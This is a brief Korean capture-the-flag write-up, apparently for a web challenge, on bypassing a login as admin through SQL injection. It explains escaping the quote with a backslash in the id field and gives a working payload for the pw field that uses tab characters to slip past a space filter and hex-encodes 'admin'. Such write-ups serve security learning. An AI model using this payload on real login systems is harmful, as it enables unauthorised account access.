# 개요
## 설명
- sql injection을 통해 admin으로 접속

## hint
id에 \ 를 넣으면 pw 인자를 받는 앞 작은따옴표까지 string으로 처리가 되므로 pw에 인젝션 코드 삽입.

## exploit
%09, \t이 안먹혀서 메모장에서 탭을 하고 그 값을 그냥 복사했음.
> id=\&pw=)||   id  like    0x61646d696e    --  